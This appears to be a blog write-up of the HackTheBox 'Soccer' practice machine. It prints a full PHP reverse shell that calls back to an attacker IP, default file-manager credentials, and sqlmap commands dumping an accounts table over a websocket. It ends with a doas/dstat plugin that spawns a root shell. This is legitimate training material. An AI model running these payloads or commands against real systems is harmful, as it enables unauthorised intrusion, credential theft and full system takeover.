---
title: "Soccer HackTheBox" 
date: 2025-10-04 09:19:00 0000+
tags: [WriteUp, Soccer, HTB, File Manager, old version,reverse shell, python, DOAS, plugins ,SQL Injection, web-sockets, SQLmap, default creds, automation, CVE-2021-45010, Linux, Privilege Escalation]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Soccer_HTB/preview_soccer.png
---
# Soccer HTB Writeup

Soccer is an easy linux box on HackTheBox showcasing multiple vulnerabilities, at first we have a Tiny File Manager service running on the server with a vulnerable version having default credentials, It helps us to drop a reverse shell which is CVE-2021-45010. After getting a shell on the box, enumerating more leads us to an another subdomain running on the box which is vulnerable to web-sockets SQL injection, exploiting it helps us to do lateral movement on the box and lastly for the privilege escalation part there is a doas binary allowed to run as root with python plugins giving us the root on the box.

![image.png](/assets/images/Soccer_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.244.2
```

![image.png](/assets/images/Soccer_HTB/image%201.png)

Looking at the results we only have 3 ports open on the box.

Ports being **SSH**, **HTTP** and one unknown port running some xmlmail unknown service.

Lets proceed with the web enumeration.

### Web Enumeration

Visiting port 80 reveals the hostname of the box as **soccer.htb**, lets add this to our **/etc/hosts** file.

![image.png](/assets/images/Soccer_HTB/image%202.png)

Now visiting [http://soccer.htb/](http://soccer.htb/) we have a page.

![image.png](/assets/images/Soccer_HTB/image%203.png)

Its just a static site and none of the links were redirecting me to get a clue.

### Directory Busting

Did directory busting on the site using **feroxbuster** on port 80.

```bash
feroxbuster -u http://soccer.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -x php,html,aspx,txt
```

![image.png](/assets/images/Soccer_HTB/image%204.png)

Found a file manager service link as [http://soccer.htb/tiny/](http://soccer.htb/tiny/)

Visiting this link lands us on this page.

![image.png](/assets/images/Soccer_HTB/image%205.png)

Now here we need credentials to log in, I googled the default credentials to login to this Tiny File Manager and these credentials came up.

```bash
admin:admin@123
user:12345
```

Tried the first pair of credentials on the login page and guess what we are in.

![image.png](/assets/images/Soccer_HTB/image%206.png)

After logging in as Admin we have this page.

## Exploitation

### Shell as www-data

Now here in dashboard the the **tiny file manager version** is written as **2.4.3.**

There must be exploits online, but I think we can get a shell on the box since we are already inside the web app as administrator.

Also we can upload files too.

I will use this **php-reverse-shell** by **pentestmonkey**.

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.24';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
// Fork and have the parent process exit
$pid = pcntl_fork();

if ($pid == -1) {
  printit("ERROR: Can't fork");
  exit(1);
}

if ($pid) {
  exit(0);  // Parent exits
}

// Make the current process a session leader
// Will only succeed if we forked
if (posix_setsid() == -1) {
  printit("Error: Can't setsid()");
  exit(1);
}

$daemon = 1;
} else {
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}

// Spawn shell process
$descriptorspec = array(
  0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
  1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
  2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
printit("ERROR: Can't spawn shell");
exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
// Check for end of TCP connection
if (feof($sock)) {
  printit("ERROR: Shell connection terminated");
  break;
}

// Check for end of STDOUT
if (feof($pipes[1])) {
  printit("ERROR: Shell process terminated");
  break;
}

// Wait until a command is end down $sock, or some
// command output is available on STDOUT or STDERR
$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

// If we can read from the TCP socket, send
// data to process's STDIN
if (in_array($sock, $read_a)) {
  if ($debug) printit("SOCK READ");
  $input = fread($sock, $chunk_size);
  if ($debug) printit("SOCK: $input");
  fwrite($pipes[0], $input);
}

// If we can read from the process's STDOUT
// send data down tcp connection
if (in_array($pipes[1], $read_a)) {
  if ($debug) printit("STDOUT READ");
  $input = fread($pipes[1], $chunk_size);
  if ($debug) printit("STDOUT: $input");
  fwrite($sock, $input);
}

// If we can read from the process's STDERR
// send data down tcp connection
if (in_array($pipes[2], $read_a)) {
  if ($debug) printit("STDERR READ");
  $input = fread($pipes[2], $chunk_size);
  if ($debug) printit("STDERR: $input");
  fwrite($sock, $input);
}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
if (!$daemon) {
  print "$string\n";
}
}

?>
```

Lets upload our shell.php file to the webserver.

I have uploaded the shell to the [http://soccer.htb/tiny/uploads](http://soccer.htb/tiny/uploads) directory.

![image.png](/assets/images/Soccer_HTB/image%207.png)

Now we start a listener using netcat on port 9001.

```php
nc -lnvp 9001
```

Now curling to get a hit back on our listener.

```bash
curl http://soccer.htb/tiny/uploads/shell.php
```

![image.png](/assets/images/Soccer_HTB/image%208.png)

Now lets stabilize the shell using the python’s pty module.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl+z
stty raw -echo;fg
stty rows 120 cols 120
```

![image.png](/assets/images/Soccer_HTB/image%209.png)

All of the above commands helped us to get a stabilized shell on the box.

Now lets search for any potential horizontal or vertical escalations on the box.

Enumerating through the box, I discovered an another sub-domain and the network configuration states that MySQL and the unknown service is running on 3306 and 9091.

![image.png](/assets/images/Soccer_HTB/image%2010.png)

Adding **soc-player.soccer.htb** to our /etc/hosts file.

There were only 2 legit users who can get a shell on the box.

```bash
cat /etc/passwd | grep bash
```

![image.png](/assets/images/Soccer_HTB/image%2011.png)

So lets try to get to this user **player.**

### Directory Busting 2

Ran feroxbuster on the subdomain [http://soc-player.soccer.htb/](http://soc-player.soccer.htb/)

```bash
feroxbuster -u http://soc-player.soccer.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -k -x php,html,aspx,txt
```

![image.png](/assets/images/Soccer_HTB/image%2012.png)

We discovered an another login page.

![image.png](/assets/images/Soccer_HTB/image%2013.png)

Lets signup and try to login to this page.

After signing up and logging in to the webpage we have this page.

![image.png](/assets/images/Soccer_HTB/image%2014.png)

When I entered a ticket number in the ticket space, It returned **Ticket Exists.**

![image.png](/assets/images/Soccer_HTB/image%2015.png)

Captured this request in Burpsuite and found out that it is making connection to the **websocket** on port 9091.

![image.png](/assets/images/Soccer_HTB/image%2016.png)

### SQLmap (SQL Injection)

So what we can do here is that we can capture this data and send it to sqlmap for testing of potential SQL Injection in this.

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data {"id":"*"} --level=5 --risk=3 --technique=B
```

![image.png](/assets/images/Soccer_HTB/image%2017.png)

Now what we can do here is dump all the data using the —dump-all command in **sqlmap**.

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data {"id":"*"} --level=5 --risk=3 --technique=B --dump-all --threads 10
```

![image.png](/assets/images/Soccer_HTB/image%2018.png)

This helped us to get the required database.

Now lets extract the tables.

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' -D soccer_db --tables --dbms mysql --batch --level 5 --risk 3 --threads 10
```

![image.png](/assets/images/Soccer_HTB/image%2019.png)

And now we dump all the data from the database **soccer_db** and from its table named accounts.

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' -D soccer_db -T accounts --dump --dbms mysql --batch --level 5 --risk 3 --threads 10
```

![image.png](/assets/images/Soccer_HTB/image%2020.png)

Now we have valid credentials. Lets try to validate these credentials across the box.

### Shell as Player

```bash
nxc ssh soccer.htb -u player -p PlayerOftheMatch2022
```

![image.png](/assets/images/Soccer_HTB/image%2021.png)

Logging in using SSH.

```bash
ssh player@soccer.htb
```

![image.png](/assets/images/Soccer_HTB/image%2022.png)

Claiming the user.txt and submitting it.

## Privilege Escalation

### DOAS privilege escalation

Now here when I ran a command to list all the **SUID binaries** on the box.

```bash
find / -user root -perm /4000 2>/dev/null
```

![image.png](/assets/images/Soccer_HTB/image%2023.png)

In this we have a odd binary as **/usr/local/bin/doas** which could be the potential privilege escalation method.

Also I found this binary earlier as **www-data** but could not found a way to ran this, lets try to run this binary with **player** as the user.

Lets first find the config file of the **doas** binary.

```bash
find / -type f -name "doas.conf" 2>/dev/null
```

![image.png](/assets/images/Soccer_HTB/image%2024.png)

Listing the contents of the **doas** binary.

```bash
cat /usr/local/etc/doas.conf
```

![image.png](/assets/images/Soccer_HTB/image%2025.png)

It means that the user player can run **/usr/bin/dstat** as root.

And **dstat** can exploit this privilege. Now from **gtfobins** we have this.

![image.png](/assets/images/Soccer_HTB/image%2026.png)

So lets create a python script file with the name **dstat_aashwin.py**

And the contents of this file name will be.

```python
import os
os.system("/bin/bash")
```

Now simply as **player** we run dstat with **doas**.

```bash
doas /usr/bin/dstat --aashwin
```

![image.png](/assets/images/Soccer_HTB/image%2027.png)

We are root!

Claiming root.txt and submitting it!

![image.png](/assets/images/Soccer_HTB/image%2028.png)

Rooted !

![image.png](/assets/images/Soccer_HTB/image%2029.png)

Thanks for reading 😊✌️
